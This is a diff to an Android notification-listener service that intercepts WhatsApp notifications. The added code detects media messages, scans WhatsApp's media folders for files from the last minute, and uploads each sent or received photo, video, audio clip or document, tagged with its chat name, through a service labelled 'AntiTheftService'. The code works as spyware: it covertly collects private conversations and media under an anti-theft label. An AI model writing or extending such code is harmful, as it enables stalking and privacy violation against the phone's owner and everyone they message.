@@ -5,14 +5,20 @@ import android.app.Person
 import android.content.Context
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.os.Parcelable
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import android.util.Log
 import kotlinx.serialization.json.Json
 import kotlinx.serialization.builtins.serializer
+import java.io.File
 
 class WhatsAppNotificationListener : NotificationListenerService() {
+
+    private val handler = Handler(Looper.getMainLooper())
+    private val scannedTimestamps = mutableSetOf<Long>()
 
     override fun onNotificationPosted(sbn: StatusBarNotification) {
         if (!WHATSAPP_PACKAGES.contains(sbn.packageName)) return
@@ -29,7 +35,17 @@ class WhatsAppNotificationListener : NotificationListenerService() {
         }
 
         for (msg in messages) {
-            sendWhatsAppMessage(msg)
+            val mediaType = detectMediaType(msg.content)
+            if (mediaType != null) {
+                val chatName = msg.address
+                Log.d("WhatsAppListener", "Media detected: type=$mediaType chat=$chatName, scheduling scan")
+                handler.postDelayed({ scanAndUploadMedia(mediaType, chatName, msg.timestamp) }, 5000)
+                if (!isMediaOnlyText(msg.content)) {
+                    sendWhatsAppMessage(msg)
+                }
+            } else {
+                sendWhatsAppMessage(msg)
+            }
         }
     }
 
@@ -173,6 +189,76 @@ class WhatsAppNotificationListener : NotificationListenerService() {
             Log.d("WhatsAppListener", "forwarded message to $cleanName: $sent")
         } catch (e: Exception) {
             Log.e("WhatsAppListener", "Failed to forward message: ${e.message}")
+        }
+    }
+
+    private fun detectMediaType(content: String): String? {
+        val lower = content.lowercase()
+        return when {
+            lower.contains("mensagem de voz") || lower.contains("voice message") -> "audio"
+            lower.contains("audio") || lower.contains(" áudio") -> "audio"
+            lower.contains("video") || lower.contains("vídeo") -> "video"
+            lower.contains("foto") || lower.contains("📷") || lower.contains("imagem") -> "image"
+            lower.contains("documento") || lower.contains("document") -> "document"
+            lower.contains("figurinha") || lower.contains("sticker") -> "image"
+            lower.contains("gif") -> "image"
+            else -> null
+        }
+    }
+
+    private fun isMediaOnlyText(content: String): Boolean {
+        val trimmed = content.trim()
+        return trimmed.matches(Regex("^[\\p{So}\\p{Cc}\\d\\s():.,/-]+$")) ||
+               trimmed.matches(Regex("^[📷🎥🎤📹🏷️📎](\\s*\\(.+\\))?$")) ||
+               trimmed.lowercase().let { lower ->
+                   lower.startsWith("foto") || lower.startsWith("imagem") ||
+                   lower.startsWith("vídeo") || lower.startsWith("video") ||
+                   lower.startsWith("áudio") || lower.startsWith("audio") ||
+                   lower.startsWith("mensagem de voz") ||
+                   lower.startsWith("documento") ||
+                   lower.startsWith("figurinha") ||
+                   lower.startsWith("sticker") ||
+                   lower.startsWith("gif")
+               }
+    }
+
+    private fun scanAndUploadMedia(mediaType: String, chatName: String, timestamp: Long) {
+        if (scannedTimestamps.contains(timestamp)) return
+        scannedTimestamps.add(timestamp)
+        if (scannedTimestamps.size > 100) scannedTimestamps.clear()
+
+        val now = System.currentTimeMillis()
+        val cutoff = now - 60_000
+
+        val folders = when (mediaType) {
+            "image" -> WhatsAppPaths.allImageFolders().map { File(it) }
+            "video" -> WhatsAppPaths.allVideoFolders().map { File(it) }
+            "audio" -> WhatsAppPaths.allAudioFolders().map { File(it) }
+            "document" -> WhatsAppPaths.allDocumentFolders().map { File(it) }
+            else -> emptyList()
+        }
+
+        for (dir in folders) {
+            if (!dir.exists() || !dir.isDirectory) continue
+            val isSent = dir.name == "Sent" || dir.absolutePath.contains("/Sent")
+            val files = dir.listFiles() ?: continue
+            for (file in files) {
+                if (!file.isFile) continue
+                if (file.lastModified() < cutoff) continue
+                if (file.length() < 1000) continue
+                if (scannedTimestamps.contains(file.absolutePath.hashCode().toLong())) continue
+
+                scannedTimestamps.add(file.absolutePath.hashCode().toLong())
+                val caption = when (mediaType) {
+                    "image" -> "📷 Imagem"
+                    "video" -> "🎥 Vídeo"
+                    "audio" -> "🎤 Áudio"
+                    else -> "📎 Arquivo"
+                }
+                val address = chatName
+                Log.d("WhatsAppListener", "Uploading $mediaType ${if (isSent) "sent" else "received"}: ${file.name} (${file.length()} bytes) chat=$address")
+                AntiTheftService.uploadWhatsAppMedia(file, mediaType, isSent, address, chatName, caption)
+            }
         }
     }
 
